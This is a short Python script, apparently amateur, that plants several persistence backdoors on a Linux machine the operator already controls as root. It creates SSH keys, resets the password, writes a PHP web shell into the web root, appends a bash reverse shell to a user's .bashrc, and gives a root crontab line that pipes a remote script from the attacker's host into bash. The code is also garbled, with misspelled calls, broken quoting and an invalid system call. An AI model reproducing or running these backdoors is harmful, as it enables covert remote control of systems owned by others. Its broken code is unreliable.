#!/usr/bin/python3
import os
import colored
from termcolor import colored

sshkeygen = 'ssh-keygen'
passwd = 'passwd'
cdone = 'cd /var/www/html'
print(" look u need a root acces to help this script to run ")

ip= input("enter your ip: ")
port= input("enter the port you want to listen on: ")

print("your ip "+ip+" your port you need to listen on " +port)

# first backdor (ssh key)
os.system(shkeygen)

print("you first backdoor is done make sure to save the private key")

print(colored('first backdoor done!, check the private key and use them', 'green', 'on_red'))

os.system(passwd)

print(colored('note your new password and use them as a backdoor!', 'red', 'on_green'))

# php backdoor
os.chdir("/var/www/html")
os.sytem('echo '<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>' > new.php')

print(colored('and now the 3rd backdoor is done you need now to just visite thr http://<target ip>/new.php?cmd=(any command you want) so we have created a vulnarable php page allow us to do any command we want', 'green','on_red'))

# .bashrc
x= input("enter the user home directory that contain the .bashrc file  format[/home/user] dont forget this whit this format !! ")
os.chdir(x)
os.system('echo 'bash -i >& /dev/tcp/+ip+/+port+ 0>&1' >> ~/.bashrc')

print(".bashrc backdoor done you need to start your listener on the ort you changed and if the user  login you will gonna get a shell")

os.sytem('echo 'bash -i >& /dev/tcp/+ip+/+port+ 0>&1' > shell.sh ')

print('now you need to add this line to the crontab -e [* *     * * *   root    curl http://<yourip>:8080/shell.php | bash] and make sure you run your nc listener or any listener and wait for your root shell')

os(crontab -e -u root)
print("after puting the line you need to resive a root shell any one minute")

















